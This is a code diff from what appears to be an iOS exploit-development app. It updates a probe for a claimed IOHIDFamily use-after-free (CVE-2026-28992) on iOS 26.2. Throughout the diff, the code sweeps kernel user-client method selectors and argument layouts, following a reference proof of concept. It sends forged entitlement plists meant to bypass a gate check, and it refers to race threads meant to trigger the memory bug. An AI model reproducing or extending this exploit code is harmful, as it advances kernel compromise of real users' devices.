@@ -651,7 +651,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *iohidConf = [UIButtonConfiguration filledButtonConfiguration];
     iohidConf.baseBackgroundColor = [UIColor systemPurpleColor];
     self.iohidUAFButton.configuration = iohidConf;
-    [self.iohidUAFButton setTitle:@"CVE-2026-28992 Method Probe v2" forState:UIControlStateNormal];
+    [self.iohidUAFButton setTitle:@"CVE-2026-28992 Arg Probe v3" forState:UIControlStateNormal];
     [self.iohidUAFButton addTarget:self action:@selector(iohidUAFTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.iohidUAFButton];
 
@@ -7067,10 +7067,9 @@ static void *iohid_threadCopyEvent(void *arg) {
     }
 
     [self appendLog:@"\n============================================================"];
-    [self appendLog:@"  CVE-2026-28992 v2 — IOHIDFamily method table probe"];
+    [self appendLog:@"  CVE-2026-28992 v3 — Exact PoC arg layout probe"];
     [self appendLog:@"  Target: iOS 26.2 | iPhone 13 (A15, no MTE)"];
-    [self appendLog:@"  Probing FastPathUserClient external method table"];
-    [self appendLog:@"  (v1 gate bypass returned kIOReturnUnsupported on all conns)"];
+    [self appendLog:@"  Probing with reference PoC argument formats"];
     [self appendLog:@"============================================================"];
 
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -7084,7 +7083,7 @@ static void *iohid_threadCopyEvent(void *arg) {
             _iohidRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.iohidUAFButton.enabled = YES;
-                [self.iohidUAFButton setTitle:@"CVE-2026-28992 Method Probe v2" forState:UIControlStateNormal];
+                [self.iohidUAFButton setTitle:@"CVE-2026-28992 Arg Probe v3" forState:UIControlStateNormal];
             });
         }
     });
@@ -7144,98 +7143,127 @@ static void *iohid_threadCopyEvent(void *arg) {
         return;
     }
 
-    // Step 4: Probe external method table (iOS 26.2 may have different layout)
-    [log appendString:@"\n--- Probing FastPathUserClient external methods (sel 0-9) ---\n"];
+    // ================================================================
+    // Step 4: v3 — Probe with EXACT PoC argument layouts
+    // v2 showed: sel1(scalar) works, sel0/2 fail with wrong arg formats
+    // PoC uses: sel0=1scalar+XML, sel1=1scalar, sel2=2scalars{0,1}
+    // ================================================================
+    [log appendString:@"\n--- v3: Exact PoC argument layout probe ---\n"];
+
     io_connect_t probeConn = iohid_g_conns[0];
     uint64_t scalar = 0;
+    uint64_t scalar2[2] = { 0, 1 };   // PoC copyEvent args
 
-    // sel0 (expected: gate/open) — iOS 26.2 returns kIOReturnUnsupported for XML dict
-    kern_return_t sel_ret[10];
+    // ---- A: Exact PoC formats for known selectors ----
+    // sel0: PoC uses 1 scalar + XML struct input
+    [log appendString:@"\n[PoC exact formats]\n"];
+    kern_return_t kr;
+
+    kr = sIOConnectCallMethod(probeConn, 0,
+        &scalar, 1,                           // 1 scalar (PoC)
+        iohid_g_gateXML.bytes, iohid_g_gateXML.length,  // XML struct (PoC)
+        NULL, NULL, NULL, NULL);
+    [log appendFormat:@"  sel0 (1s+XML): 0x%x %s\n", kr, mach_error_string(kr)];
+
+    kr = sIOConnectCallMethod(probeConn, 1,
+        &scalar, 1,                           // 1 scalar (PoC)
+        NULL, 0,                              // no struct (PoC)
+        NULL, NULL, NULL, NULL);
+    [log appendFormat:@"  sel1 (1s): 0x%x %s\n", kr, mach_error_string(kr)];
+
+    kr = sIOConnectCallMethod(probeConn, 2,
+        scalar2, 2,                           // 2 scalars {0,1} (PoC)
+        NULL, 0,                              // no struct (PoC)
+        NULL, NULL, NULL, NULL);
+    [log appendFormat:@"  sel2 (2s{0,1}): 0x%x %s\n", kr, mach_error_string(kr)];
+
+    kr = sIOConnectCallMethod(probeConn, 2,
+        &scalar, 1,                           // 1 scalar (alt)
+        NULL, 0, NULL, NULL, NULL, NULL);
+    [log appendFormat:@"  sel2 (1s): 0x%x %s\n", kr, mach_error_string(kr)];
+
+    kr = sIOConnectCallMethod(probeConn, 2,
+        scalar2, 2,                           // 2 scalars + XML struct
+        iohid_g_gateXML.bytes, iohid_g_gateXML.length,
+        NULL, NULL, NULL, NULL);
+    [log appendFormat:@"  sel2 (2s+XML): 0x%x %s\n", kr, mach_error_string(kr)];
+
+    // ---- B: Scalar count sweep for sel0-9 (1, 2, 3 scalars) ----
+    [log appendString:@"\n[Scalar count sweep — 1 scalar]\n"];
     for (int sel = 0; sel <= 9; sel++) {
-        // Try with gate XML first
-        sel_ret[sel] = sIOConnectCallMethod(probeConn, sel,
-            NULL, 0,
+        uint64_t s1 = 0;
+        kr = sIOConnectCallMethod(probeConn, sel, &s1, 1, NULL, 0, NULL, NULL, NULL, NULL);
+        [log appendFormat:@"  sel%d (1s): 0x%x %s\n", sel, kr, mach_error_string(kr)];
+    }
+
+    [log appendString:@"\n[Scalar count sweep — 2 scalars]\n"];
+    for (int sel = 0; sel <= 9; sel++) {
+        uint64_t s2[2] = { 0, 1 };
+        kr = sIOConnectCallMethod(probeConn, sel, s2, 2, NULL, 0, NULL, NULL, NULL, NULL);
+        [log appendFormat:@"  sel%d (2s): 0x%x %s\n", sel, kr, mach_error_string(kr)];
+    }
+
+    [log appendString:@"\n[Scalar count sweep — 3 scalars]\n"];
+    for (int sel = 0; sel <= 9; sel++) {
+        uint64_t s3[3] = { 0, 0, 0 };
+        kr = sIOConnectCallMethod(probeConn, sel, s3, 3, NULL, 0, NULL, NULL, NULL, NULL);
+        [log appendFormat:@"  sel%d (3s): 0x%x %s\n", sel, kr, mach_error_string(kr)];
+    }
+
+    // ---- C: Scalar + struct combos for sel0 and sel2 ----
+    [log appendString:@"\n[Scalar + XML struct combos]\n"];
+    // sel0 with 0,1,2,3 scalars + XML
+    for (int n = 0; n <= 3; n++) {
+        uint64_t sn[3] = { 0, 0, 0 };
+        kr = sIOConnectCallMethod(probeConn, 0,
+            (n > 0) ? sn : NULL, n,
             iohid_g_gateXML.bytes, iohid_g_gateXML.length,
             NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  sel%d (gateXML): 0x%x %s\n", sel, sel_ret[sel],
-            mach_error_string(sel_ret[sel])];
+        [log appendFormat:@"  sel0 (%ds+XML): 0x%x %s\n", n, kr, mach_error_string(kr)];
     }
 
-    // Also probe sel0-sel9 with scalar-only (no struct input)
-    [log appendString:@"\n  Scalar-only probe:\n"];
-    for (int sel = 0; sel <= 9; sel++) {
-        kern_return_t kr = sIOConnectCallMethod(probeConn, sel,
-            &scalar, 1, NULL, 0,
+    // sel2 with 0,1,2,3 scalars + XML
+    for (int n = 0; n <= 3; n++) {
+        uint64_t sn[3] = { 0, 1, 0 };
+        kr = sIOConnectCallMethod(probeConn, 2,
+            (n > 0) ? sn : NULL, n,
+            iohid_g_gateXML.bytes, iohid_g_gateXML.length,
             NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  sel%d (scalar): 0x%x %s\n", sel, kr,
-            mach_error_string(kr)];
+        [log appendFormat:@"  sel2 (%ds+XML): 0x%x %s\n", n, kr, mach_error_string(kr)];
     }
 
-    // Probe sel0-sel9 with empty call (no input at all)
-    [log appendString:@"\n  No-input probe:\n"];
-    for (int sel = 0; sel <= 9; sel++) {
-        kern_return_t kr = sIOConnectCallMethod(probeConn, sel,
-            NULL, 0, NULL, 0,
+    // ---- D: Probe different user client types (maybe type 2 changed) ----
+    [log appendString:@"\n[User client type probe (sel0 1s+XML)]\n"];
+    for (int t = 0; t <= 5; t++) {
+        io_connect_t tc = 0;
+        kr = sIOServiceOpen(service, mach_task_self_, t, &tc);
+        if (kr != KERN_SUCCESS) {
+            [log appendFormat:@"  type=%d open: 0x%x %s\n", t, kr, mach_error_string(kr)];
+            continue;
+        }
+        // Try gate on this type
+        uint64_t ts = 0;
+        kern_return_t gkr = sIOConnectCallMethod(tc, 0,
+            &ts, 1,
+            iohid_g_gateXML.bytes, iohid_g_gateXML.length,
             NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  sel%d (noinput): 0x%x %s\n", sel, kr,
-            mach_error_string(kr)];
-    }
+        [log appendFormat:@"  type=%d sel0 (1s+XML): 0x%x %s\n", t, gkr, mach_error_string(gkr)];
 
-    // Also try sel0 with different gate formats
-    [log appendString:@"\n  Gate format variants for sel0:\n"];
+        // Also try sel1/scalar on this type
+        gkr = sIOConnectCallMethod(tc, 1, &ts, 1, NULL, 0, NULL, NULL, NULL, NULL);
+        [log appendFormat:@"  type=%d sel1 (1s): 0x%x %s\n", t, gkr, mach_error_string(gkr)];
 
-    // Binary plist
-    NSError *err = nil;
-    NSDictionary *gateDict = @{
-        @"FastPathHasEntitlement": @YES,
-        @"FastPathMotionEventEntitlement": @YES,
-    };
-    NSData *binaryGate = [NSPropertyListSerialization dataWithPropertyList:gateDict
-        format:NSPropertyListBinaryFormat_v1_0 options:0 error:&err];
-    if (binaryGate) {
-        kern_return_t kr = sIOConnectCallMethod(probeConn, 0,
-            NULL, 0, binaryGate.bytes, binaryGate.length,
-            NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  sel0 (binary): 0x%x %s\n", kr, mach_error_string(kr)];
-    }
+        // sel2 with 2 scalars
+        uint64_t t2[2] = { 0, 1 };
+        gkr = sIOConnectCallMethod(tc, 2, t2, 2, NULL, 0, NULL, NULL, NULL, NULL);
+        [log appendFormat:@"  type=%d sel2 (2s): 0x%x %s\n", t, gkr, mach_error_string(gkr)];
 
-    // XML with different root
-    NSDictionary *altDict = @{
-        @"FastPathHasEntitlement": @YES,
-    };
-    NSData *altXML = [NSPropertyListSerialization dataWithPropertyList:altDict
-        format:NSPropertyListXMLFormat_v1_0 options:0 error:&err];
-    if (altXML) {
-        kern_return_t kr = sIOConnectCallMethod(probeConn, 0,
-            NULL, 0, altXML.bytes, altXML.length,
-            NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  sel0 (single-key): 0x%x %s\n", kr, mach_error_string(kr)];
-    }
-
-    // Raw bytes (4 bytes of 0x01)
-    uint8_t rawGate[4] = { 0x01, 0x00, 0x00, 0x00 };
-    kern_return_t rawKr = sIOConnectCallMethod(probeConn, 0,
-        NULL, 0, rawGate, 4,
-        NULL, NULL, NULL, NULL);
-    [log appendFormat:@"  sel0 (raw 0x01): 0x%x %s\n", rawKr, mach_error_string(rawKr)];
-
-    // Empty dict XML
-    NSDictionary *emptyDict = @{};
-    NSData *emptyXML = [NSPropertyListSerialization dataWithPropertyList:emptyDict
-        format:NSPropertyListXMLFormat_v1_0 options:0 error:&err];
-    if (emptyXML) {
-        kern_return_t kr = sIOConnectCallMethod(probeConn, 0,
-            NULL, 0, emptyXML.bytes, emptyXML.length,
-            NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  sel0 (empty dict): 0x%x %s\n", kr, mach_error_string(kr)];
+        sIOServiceClose(tc);
     }
 
     // Flush probe results
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
-
-    // Skip race for now — gate bypass failed, need to map methods first
-    [log appendString:@"\n⚠ Gate bypass failed on all formats — method table mapping needed.\n"];
-    [log appendString:@"  Skipping race. Device survived (expected).\n"];
+    [log appendString:@"\n--- v3 probe complete ---\n"];
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 
     // Cleanup
